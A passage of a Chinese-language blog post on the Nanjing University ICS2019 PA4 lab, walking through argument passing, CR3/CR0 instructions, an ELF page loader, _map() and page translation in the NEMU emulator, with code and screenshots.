class="hljs-type">void</span>**)(argv_stack_addr);*argv_stack=(<span class="hljs-type">void</span>*)(ustack.end-space_count+<span class="hljs-number">16</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"argv_stack addr:%x\n"</span>,(<span class="hljs-type">uintptr_t</span>)(argv_stack));<span class="hljs-built_in">printf</span>(<span class="hljs-string">"argv_stack value:%x\n"</span>,(<span class="hljs-type">uintptr_t</span>)(*argv_stack));<span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-title">memcpy</span><span class="hljs-params">(<span class="hljs-type">void</span>* dst,<span class="hljs-type">void</span>* src,<span class="hljs-type">size_t</span> n)</span></span>;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;argc;i++){  <span class="hljs-type">void</span>** str_stack=(<span class="hljs-type">void</span>**)(pos);  <span class="hljs-comment">//copy the string</span>  <span class="hljs-comment">// memcpy(*str_stack,argv[i],strlen(argv[i])+1);</span>  <span class="hljs-built_in">strcpy</span>(*str_stack,argv[i]);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"str %s stored at addr:%x\n"</span>,(<span class="hljs-type">char</span>*)(*str_stack),(<span class="hljs-type">uintptr_t</span>)(str_stack));  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the val of the str addr is %x\n"</span>,(<span class="hljs-type">uintptr_t</span>)(*str_stack));  argv_strs[i]=(<span class="hljs-type">char</span>*)(*str_stack);  pos+=<span class="hljs-built_in">strlen</span>(argv[i])+<span class="hljs-number">1</span>;}<span class="hljs-comment">//copy the argv</span><span class="hljs-comment">// memcpy(*argv_stack,argv_strs,argc*sizeof(char*));</span><span class="hljs-built_in">strcpy</span>(*argv_stack,argv_strs);<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;argc;i++){  <span class="hljs-type">void</span> ** temp=(<span class="hljs-type">void</span>**)(*argv_stack);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"argv %x stored at addr:%x\n"</span>,(<span class="hljs-type">uintptr_t</span>)(temp[i]),(<span class="hljs-type">uintptr_t</span>)(temp+i));  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"it points to %s\n"</span>,(<span class="hljs-type">char</span>*)(temp[i]));}</code></pre></div></div><p>而且这种方法在开启分页之后也没跑成功。</p><p>后来发现有个<a href="https://vgalaxy.work/2022/01/01/icspa4/#%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%8F%82%E6%95%B0">博客</a>的问题和我类似:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205708311090_229_20230601235508361359_580_image-20230531210624959.png" alt="image-20230531210624959"><figcaption aria-hidden="true">image-20230531210624959</figcaption></figure><p>但是我尝试了传完整路径，还是不行(哭)</p><p>把PA其他部分做完回过头来尝试解决这个问题未果。不过既然<code>argc</code>能正常传递，想跳过商标页面还是能实现的。我们就用<code>argc</code>判断。</p><p><code>pal-main.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-skcyqvlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-skcyqvlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><span class="hljs-function"></span>{<span class="hljs-built_in">Log</span>(<span class="hljs-string">"game start!"</span>);<span class="hljs-built_in">Log</span>(<span class="hljs-string">"here show the args:"</span>);<span class="hljs-built_in">Log</span>(<span class="hljs-string">"argc: %d"</span>, argc);<span class="hljs-comment">//log the address of argv</span><span class="hljs-built_in">Log</span>(<span class="hljs-string">"argv: %x"</span>, argv);<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; argc; i++){<span class="hljs-type">char</span>* arg = argv[i];<span class="hljs-built_in">Log</span>(<span class="hljs-string">"argv[%d]: %s"</span>, i, arg);}<span class="hljs-built_in">hal_init</span>();<span class="hljs-built_in">main_loop</span>(argc);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p><code>main.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wus23alluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-wus23alluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (argc!=<span class="hljs-number">2</span>){   <span class="hljs-built_in">PAL_TrademarkScreen</span>();   <span class="hljs-built_in">PAL_SplashScreen</span>();}</code></pre></div></div><p>可以看到直接跳过了加载动画。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205709364413_382_20230601235512642869_760_image-20230531212149363.png" alt="image-20230531212149363"><figcaption aria-hidden="true">image-20230531212149363</figcaption></figure><h2 id="阶段二">阶段二</h2><h3 id="理解分页机制">理解分页机制</h3><h4 id="理解分页细节">理解分页细节</h4><ul><li>内存分页一页大小时 <span class="math inline">\(4\mathrm{~KB}\)</span> ，那么 <span class="math inline">\(4\mathrm{~GB}\)</span> 内存被分成 <span class="math inline">\(\frac{4\mathrm{~GB}}{4 \mathrm{~KB}}=2^{20}\)</span> 页，因此只需要 20 位寻址<span class="math inline">\(2^{20}\)</span> 页即可</li><li>因为虚拟地址到物理地址需要翻译，在访问CR3是并不知道映射规则（保存在页目录中，毕竟访问CR3就是为了得到页目录) 那就肯定只能按照物理地址访问</li><li>页目录中会存储页表项 (用来寻址 <span class="math inline">\(2^{20}\)</span> 页理论上只需要 <span class="math inline">\(3 \text B\)</span> 但是为了方便一般页表项大小为<span class="math inline">\(4 \mathrm{~B}\)</span>)，那么每个进程都全部存储空间 (每一个页面)都需要的页标项记录。于是需要空间存$4B × 2^{20} = 4$存储，太大了，如果分级可以利用局部性原理有效减小页表项空间。</li></ul><p>这三个问题其实在操作系统课上宫老师都讲过，<span class="math inline">\(4KB\)</span>的页面大小设计也有巧合在里面。</p><h4 id="空指针真的是空的吗">空指针真的是空的吗</h4><p>NULL是一个标准规定的宏定义，用来表示空指针常量。在C中和早期的C++中它就是0</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i30ax9lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-i30ax9lluwpkzu"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NULL (void*)0</span></code></pre></div></div><p>后来C++有了<code>nullptr</code>这个东西，不过与这个问题没啥关系。</p><p>下面的部分引自<a href="https://www.cnblogs.com/fly1988happy/archive/2012/04/16/2452021.html#">博客园</a></p><blockquote><p>程序在使用的是系统给定的一个段，程序中的<strong>零值指针指向这个段的开端</strong>，为了保证NULL概念，系统为我们<strong>这个段的开头64K内存做了苛刻的规定</strong>，根据虚拟内存访问权限控制，我们程序中（低访问权限）访问要求<strong>高访问权限的这64K内存</strong>被视作是不容许的，所以会必然引发<strong>AccessVolitation</strong>错误，而这高权限的64K内存是一块<strong>保留内存</strong>（即<strong>不能被程序动态内存分配器分配，不能被访问，也不能被使用</strong>），就是简单的保留，不作任何使用。</p></blockquote><p>因此空指针不是真的"空"。但NULL确实是0地址，它在虚拟地址空间中没有映射/有较高的访问权限。所以访问空指针的内容会爆段错误。</p><h3 id="实现分页机制">实现分页机制</h3><p>先看一下加上<code>HAS_VME</code>是什么情况:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205710798062_415_20230601235517932149_981_image-20230529222248388.png" alt="image-20230529222248388"><figcaption aria-hidden="true">image-20230529222248388</figcaption></figure><p>是这条指令:</p><p><code>1010b0:  0f 22 d8                mov    %eax,%cr3</code></p><p>显然<code>cr3</code>的出现应当意识到与分页有关。而且是<code>invalid opcode</code>，那么就先要吧这个指令补上。这是一个两比特操作码的指令，在表的下面一部分</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fv5phylluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-fv5phylluwpkzu"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x20 */</span><span class="hljs-built_in">IDEXW</span>(G2E,mov_cr2r,<span class="hljs-number">4</span>), EMPTY, <span class="hljs-built_in">IDEXW</span>(E2G,mov_r2cr,<span class="hljs-number">4</span>), EMPTY,</code></pre></div></div><p>查阅手册<code>0x21</code>也是与<code>cr</code>寄存器有关，一起补上。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205712227982_962_20230601235521194013_589_image-20230529223520788.png" alt="image-20230529223520788"><figcaption aria-hidden="true">image-20230529223520788</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0oqj5elluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-0oqj5elluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(mov_r2cr) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-keyword">if</span> (id_dest-&gt;reg==<span class="hljs-number">0</span>) cpu.cr0.val=id_src-&gt;val;  <span class="hljs-keyword">else</span> cpu.cr3.val=id_src-&gt;val;  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"movl %%%s,%%cr%d"</span>, <span class="hljs-built_in">reg_name</span>(id_src-&gt;reg, <span class="hljs-number">4</span>), id_dest-&gt;reg);}<span class="hljs-built_in">make_EHelper</span>(mov_cr2r) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-keyword">if</span> (id_src-&gt;reg==<span class="hljs-number">0</span>) cpu.gpr[id_dest-&gt;reg]._32=cpu.cr0.val;  <span class="hljs-keyword">else</span> cpu.gpr[id_dest-&gt;reg]._32=cpu.cr3.val;  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"movl %%cr%d,%%%s"</span>, id_src-&gt;reg, <span class="hljs-built_in">reg_name</span>(id_dest-&gt;reg, <span class="hljs-number">4</span>));  <span class="hljs-built_in">difftest_skip_ref</span>();}</code></pre></div></div><p>指令实现很简单，反正我们需要考虑的要么是<code>cr0</code>要么是<code>cr3</code>。</p><p><code>CPU_state</code>也要补上这两个寄存器。寄存器的结构需<code>#include "mmu.h"</code>，在<code>nemu/src/isa/x86/include/isa/mmu.h</code>里定义。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205713198935_761_20230601235523234821_360_image-20230529224445299.png" alt="image-20230529224445299"><figcaption aria-hidden="true">image-20230529224445299</figcaption></figure><p>看上去好像能跑了？但还不是在虚拟地址上跑的嘛。因为目前<code>isa_vaddr_read()</code>,<code>isa_vaddr_write()</code>并没有进行改动。这个就合并到下一节完成。</p><h3 id="在分页机制上运行用户进程">在分页机制上运行用户进程</h3><blockquote><p>我们先单独运行dummy(别忘记修改调度代码),并先在<code>exit</code>的实现中调用<code>_halt()</code>结束系统的运行。</p></blockquote><p>先修改调度代码，省的后面忘了:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y03gsulluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-y03gsulluwpkzu"><pre><code class="hljs C++"><span class="hljs-function">_Context *<span class="hljs-title">schedule</span><span class="hljs-params">(_Context *prev)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// save the context pointer</span>  current-&gt;cp = prev;  <span class="hljs-comment">// current = ((current == &amp;pcb[0]) ? &amp;pcb[1] : &amp;pcb[0]);</span>  current = &amp;pcb[<span class="hljs-number">0</span>];  <span class="hljs-comment">// then return the new context</span>  <span class="hljs-keyword">return</span> current-&gt;cp;}</code></pre></div></div><p><code>_Context *do_syscall(_Context *c)</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3vse4alluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-3vse4alluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> SYS_exit:  _halt(a[<span class="hljs-number">1</span>]);</code></pre></div></div><p>需要按讲义中所讲取消原来进入开机菜单的选项，直接运行dummy。现在还没实现分页，可以看到也是能正常运行的。因为它只是调用了一下系统调用。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205716575380_419_20230601235527208599_859_image-20230530150819865.png" alt="image-20230530150819865"><figcaption aria-hidden="true">image-20230530150819865</figcaption></figure><p>然后打开<code>makefile.compile</code>里的<code>VME=enable</code>之后，就发现寄喽。</p><blockquote><p>我们首先需要在加载用户进程之前为其创建地址空间.由于地址空间是进程相关的,我们将<code>_AddressSpace</code>结构体作为PCB的一部分. 这样以后,我们只需要在<code>context_uload()</code>的开头调用<code>_protect()</code>,就可以实现地址空间的创建。</p></blockquote><p>目前这个地址空间除了内核映射之外就没有其它内容了。看代码确实如此。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ve7rb5lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-ve7rb5lluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">int</span> _protect(_AddressSpace *as) {  PDE *updir = (PDE*)(<span class="hljs-built_in">pgalloc_usr</span>(<span class="hljs-number">1</span>));  as-&gt;ptr = updir;  <span class="hljs-comment">// map kernel space</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_PDE; i ++) {    updir[i] = kpdirs[i];  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><blockquote><p><code>loader()</code>要做的事情是, 获取程序的大小之后,以页为单位进行加载:</p><ul><li>申请一页空闲的物理页</li><li>通过<code>_map()</code>把这一物理页映射到用户进程的虚拟地址空间中</li><li>从文件中读入一页的内容到这一物理页上</li></ul></blockquote><p>这一部分实现需要谨慎一些，注意细节,写起来也让人挺抓狂的。不过还好没在这里卡住，反而下面犯了一个很蠢的错误。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wbsakclluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-wbsakclluwpkzu"><pre><code class="hljs C++">Elf_Ehdr elf_header;<span class="hljs-type">int</span> fd = <span class="hljs-built_in">fs_open</span>(filename, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-built_in">Log</span>(<span class="hljs-string">"filename: %s, fd: %d"</span>, filename, fd);<span class="hljs-type">size_t</span> read_len = <span class="hljs-built_in">fs_read</span>(fd, &amp;elf_header, <span class="hljs-built_in">sizeof</span>(Elf_Ehdr));<span class="hljs-built_in">assert</span>(read_len == <span class="hljs-built_in">sizeof</span>(Elf_Ehdr));Elf_Phdr elf_program_header[elf_header.e_phnum];<span class="hljs-built_in">fs_lseek</span>(fd, elf_header.e_phoff, SEEK_SET);read_len = <span class="hljs-built_in">fs_read</span>(fd, elf_program_header, <span class="hljs-built_in">sizeof</span>(Elf_Phdr) * elf_header.e_phnum);<span class="hljs-built_in">assert</span>(read_len == <span class="hljs-built_in">sizeof</span>(Elf_Phdr) * elf_header.e_phnum);<span class="hljs-type">uintptr_t</span> vaddr = <span class="hljs-number">0</span>;<span class="hljs-type">size_t</span> page_num;<span class="hljs-type">void</span> *pa;<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; elf_header.e_phnum; i++){    <span class="hljs-comment">// only load PT_LOAD type</span>    <span class="hljs-keyword">if</span> (elf_program_header[i].p_type != PT_LOAD)    {        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-built_in">fs_lseek</span>(fd, elf_program_header[i].p_offset, SEEK_SET);    vaddr = elf_program_header[i].p_vaddr;    page_num = (elf_program_header[i].p_filesz - <span class="hljs-number">1</span>) / PGSIZE + <span class="hljs-number">1</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; page_num; j++)    {        pa = <span class="hljs-built_in">new_page</span>(<span class="hljs-number">1</span>);        <span class="hljs-comment">// check if the page is 4kb aligned</span>        <span class="hljs-built_in">assert</span>((vaddr &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0</span>);        _map(&amp;pcb-&gt;as, (<span class="hljs-type">void</span> *)vaddr, pa, <span class="hljs-number">1</span>);        <span class="hljs-keyword">if</span> (j &lt; page_num - <span class="hljs-number">1</span>)        {            <span class="hljs-built_in">fs_read</span>(fd, pa, PGSIZE);        }        <span class="hljs-keyword">else</span>        {            <span class="hljs-built_in">fs_read</span>(fd, pa, elf_program_header[i].p_filesz % PGSIZE);        }        vaddr += PGSIZE;    }    <span class="hljs-built_in">assert</span>(vaddr = page_num * PGSIZE + elf_program_header[i].p_vaddr);    <span class="hljs-comment">// set the rest [Virtual Address + File Size, Virtual Address + Memory Size) to 0 turns to be a little complex</span>    <span class="hljs-keyword">if</span> (elf_program_header[i].p_filesz == elf_program_header[i].p_memsz)    {        pcb-&gt;max_brk = vaddr;        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-type">int</span> zero_len = elf_program_header[i].p_memsz - elf_program_header[i].p_filesz;    <span class="hljs-keyword">if</span> (zero_len &lt; page_num * PGSIZE - elf_program_header[i].p_filesz)    {        <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)(((<span class="hljs-type">uintptr_t</span>)pa) + (elf_program_header[i].p_filesz - PGSIZE * (page_num - <span class="hljs-number">1</span>))), <span class="hljs-number">0</span>, zero_len);    }    <span class="hljs-keyword">else</span>    {        <span class="hljs-comment">// set the current page to 0</span>        <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)(((<span class="hljs-type">uintptr_t</span>)pa) + (elf_program_header[i].p_filesz - PGSIZE * (page_num - <span class="hljs-number">1</span>))), <span class="hljs-number">0</span>, PGSIZE - elf_program_header[i].p_filesz % PGSIZE);        zero_len -= (PGSIZE - elf_program_header[i].p_filesz % PGSIZE);        <span class="hljs-comment">// set the rest pages to 0 (we need to allocate new pages)</span>        page_num = (zero_len - <span class="hljs-number">1</span>) / PGSIZE + <span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; page_num; j++)        {            pa = <span class="hljs-built_in">new_page</span>(<span class="hljs-number">1</span>);            <span class="hljs-built_in">assert</span>((vaddr &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0</span>);            _map(&amp;pcb-&gt;as, (<span class="hljs-type">void</span> *)vaddr, pa, <span class="hljs-number">1</span>);            <span class="hljs-keyword">if</span> (j &lt; page_num - <span class="hljs-number">1</span>)            {                <span class="hljs-built_in">memset</span>(pa, <span class="hljs-number">0</span>, PGSIZE);            }            <span class="hljs-keyword">else</span>            {                <span class="hljs-built_in">memset</span>(pa, <span class="hljs-number">0</span>, zero_len % PGSIZE);            }            vaddr += PGSIZE;        }    }    pcb-&gt;max_brk = vaddr;}<span class="hljs-built_in">fs_close</span>(fd);<span class="hljs-keyword">return</span> elf_header.e_entry;</code></pre></div></div><blockquote><p>你需要在AM中实现<code>_map()</code>函数(在<code>nexus-am/am/src/$ISA/nemu/src/vme.c</code>中定义),你可以通过<code>as-&gt;ptr</code>获取页目录的基地址.若在映射过程中发现需要申请新的页表,可以通过回调函数<code>pgalloc_usr()</code>向Nanos-lite获取一页空闲的物理页.</p></blockquote><p><code>x86.h</code>中有一些宏可以帮我们完成页面相关的地址转换，不用自己造轮子。</p><p>判断页面存在需要看最后一位是不是1，手册里说的很清楚。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205717905352_201_20230601235531573391_617_image-20230530193239098.png" alt="image-20230530193239098"><figcaption aria-hidden="true">image-20230530193239098</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xghteulluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-xghteulluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">int</span> _map(_AddressSpace *as, <span class="hljs-type">void</span> *va, <span class="hljs-type">void</span> *pa, <span class="hljs-type">int</span> prot){  <span class="hljs-comment">// 来自讲义:将地址空间as中虚拟地址va所在的虚拟页, 以prot的权限映射到pa所在的物理页. 当prot中的present位为0时, 表示让va的映射无效</span>  PDE *pdir = (PDE *)as-&gt;ptr;  PTE *ptab;  <span class="hljs-type">uint32_t</span> pdir_idx = <span class="hljs-built_in">PDX</span>(va);  <span class="hljs-type">uint32_t</span> ptab_idx = <span class="hljs-built_in">PTX</span>(va);  <span class="hljs-keyword">if</span> (pdir[pdir_idx] &amp;PTE_P)  {    <span class="hljs-comment">// the page table is already exist</span>    ptab = (PTE *)(<span class="hljs-built_in">PTE_ADDR</span>(pdir[pdir_idx]));  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-comment">// the page table is not exist</span>    ptab = (PTE *)(<span class="hljs-built_in">PTE_ADDR</span>(<span class="hljs-built_in">pgalloc_usr</span>(<span class="hljs-number">1</span>)));    <span class="hljs-comment">// map the new-allocted page table to the pdir</span>    pdir[pdir_idx] = (<span class="hljs-type">uintptr_t</span>)ptab | PTE_P;  }  <span class="hljs-comment">// map the page</span>  ptab[ptab_idx] = <span class="hljs-built_in">PTE_ADDR</span>(pa) |PTE_P;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><blockquote><p>为了让这一地址空间生效, 我们还需要将它落实到MMU中. 具体地,我们希望在CTE恢复进程上下文的时候来切换地址空间. 为此,我们需要将进程的地址空间描述符指针加入到上下文中.框架代码已经实现了这一功能(见<code>nexus-am/am/include/arch/$ISA-nemu.h</code>),</p></blockquote><p>确实。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5l81dclluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-5l81dclluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">_Context</span> {  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_AddressSpace</span> *as;  <span class="hljs-type">uintptr_t</span> edi,esi, ebp, esp, ebx,edx,ecx,eax;  <span class="hljs-type">int</span> irq;  <span class="hljs-type">uintptr_t</span> eip, cs,eflags;};</code></pre></div></div><blockquote><p>但你还需要</p><ul><li>修改<code>_ucontext()</code>的实现,在创建的用户进程上下文中设置地址空间相关的指针<code>as</code></li><li>在<code>__am_irq_handle()</code>的开头调用<code>__am_get_cur_as()</code>(在<code>nexus-am/am/src/$ISA/nemu/vme.c</code>中定义),来将当前的地址空间描述符指针保存到上下文中</li><li>在<code>__am_irq_handle()</code>返回前调用<code>__am_switch()</code>(<code>nexus-am/am/src/$ISA/nemu/vme.c</code>中定义)来切换地址空间, 将调度目标进程的地址空间落实到MMU中</li></ul></blockquote><p>第一步，前面已经加过了。剩下的两步，照着做就好。</p><p>问题驱动。现在把<code>isa_vaddr_read()</code>和<code>isa_vaddr_write()</code>按照分页地址转换进行修改。写完<code>loader</code>和<code>_map</code>后已经算是对分页机制有较清晰的理解了，即便没有任何提示也基本完成的比较顺畅。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5qelvwlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-5qelvwlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">page_translate</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// printf("addr:%x\n",addr);</span>  <span class="hljs-type">uint32_t</span> pdir = <span class="hljs-built_in">PDX</span>(addr);  <span class="hljs-type">uint32_t</span> ptab = <span class="hljs-built_in">PTX</span>(addr);  <span class="hljs-type">uint32_t</span> offset = <span class="hljs-built_in">OFF</span>(addr);  <span class="hljs-comment">// note that PDE is a struct, rather than a uint32_t in the nexus-am</span>  PDE pde;  pde.val = <span class="hljs-built_in">paddr_read</span>(<span class="hljs-built_in">PTE_ADDR</span>(cpu.cr3.val) | (pdir &lt;&lt; <span class="hljs-number">2</span>), <span class="hljs-number">4</span>);  <span class="hljs-comment">// guarantee that the page table is present</span>  <span class="hljs-built_in">assert</span>(pde.present == <span class="hljs-number">1</span>);  PTE pte;  pte.val = <span class="hljs-built_in">paddr_read</span>(<span class="hljs-built_in">PTE_ADDR</span>(pde.val) | (ptab &lt;&lt; <span class="hljs-number">2</span>), <span class="hljs-number">4</span>);  <span class="hljs-comment">// guarantee that the page is present</span>  <span class="hljs-keyword">if</span> (pte.present == <span class="hljs-number">0</span>)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"addr:%x\n"</span>, addr);  }  <span class="hljs-built_in">assert</span>(pte.present == <span class="hljs-number">1</span>);  <span class="hljs-type">uint32_t</span> paddr = (<span class="hljs-built_in">PTE_ADDR</span>(pte.val) | offset);  <span class="hljs-comment">// printf("paddr:%x\n",paddr);</span>  <span class="hljs-keyword">return</span> paddr;}<span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">isa_vaddr_read</span><span class="hljs-params">(<span class="hljs-type">vaddr_t</span> addr, <span class="hljs-type">int</span> len)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// return paddr_read(addr, len);</span>  <span class="hljs-comment">// now we need to handle the page mapping</span>  <span class="hljs-keyword">if</span> (cpu.cr0.paging == <span class="hljs-number">0</span>)  {    <span class="hljs-comment">// no paging</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">paddr_read</span>(addr, len);  }  <span class="hljs-type">int</span> start_page_num = addr / PAGE_SIZE;  <span class="hljs-type">int</span> end_page_num = (addr + len - <span class="hljs-number">1</span>) / PAGE_SIZE;  <span class="hljs-keyword">if</span> (start_page_num == end_page_num)  {    <span class="hljs-comment">// the data is in one page</span>    <span class="hljs-type">paddr_t</span> paddr = <span class="hljs-built_in">page_translate</span>(addr);    <span class="hljs-keyword">return</span> <span class="hljs-built_in">paddr_read</span>(paddr, len);  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the data is in two pages\n"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }}<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">isa_vaddr_write</span><span class="hljs-params">(<span class="hljs-type">vaddr_t</span> addr, <span class="hljs-type">uint32_t</span> data, <span class="hljs-type">int</span> len)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> (cpu.cr0.paging == <span class="hljs-number">0</span>)  {    <span class="hljs-comment">// no paging</span>    <span class="hljs-built_in">paddr_write</span>(addr, data, len);    <span class="hljs-keyword">return</span>;  }  <span class="hljs-type">int</span> start_page_num = addr / PAGE_SIZE;  <span class="hljs-type">int</span> end_page_num = (addr + len - <span class="hljs-number">1</span>) / PAGE_SIZE;  <span class="hljs-keyword">if</span> (start_page_num == end_page_num)  {    <span class="hljs-comment">// the data is in one page</span>    <span class="hljs-type">paddr_t</span> paddr = <span class="hljs-built_in">page_translate</span>(addr);    <span class="hljs-built_in">paddr_write</span>(paddr, data, len);  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the data is in two pages\n"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }}</code></pre></div></div><p>改正之后能够在分页机制上Hit good trap。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205718828968_290_20230601235535787076_209_image-20230530215433304.png" alt="image-20230530215433304"><figcaption aria-hidden="true">image-20230530215433304</figcaption></figure><h3 id="在分页机制上运行仙剑奇侠传">在分页机制上运行仙剑奇侠传</h3><blockquote><p>现在用户进程运行在分页机制之上,我们还需要在<code>mm_brk()</code>中把新申请的堆区映射到虚拟地址空间中,这样才能保证运行在分页机制上的用户进程可以正确地访问新申请的堆区.</p></blockquote><p>如文中所述:</p><blockquote><p>我们可以不实现堆区的回收功能, 而是只为当前新programbreak超过<code>max_brk</code>部分的虚拟地址空间分配物理页.</p></blockquote><p>据此实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wq6o61lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-wq6o61lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mm_brk</span><span class="hljs-params">(<span class="hljs-type">uintptr_t</span> brk, <span class="hljs-type">intptr_t</span> increment)</span> </span>{<span class="hljs-keyword">if</span> (brk+increment&gt;current-&gt;max_brk){<span class="hljs-type">int</span> new_pgnum=((brk+increment-current-&gt;max_brk)+<span class="hljs-number">0xfff</span>)/PGSIZE;<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=new_pgnum<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;--i){<span 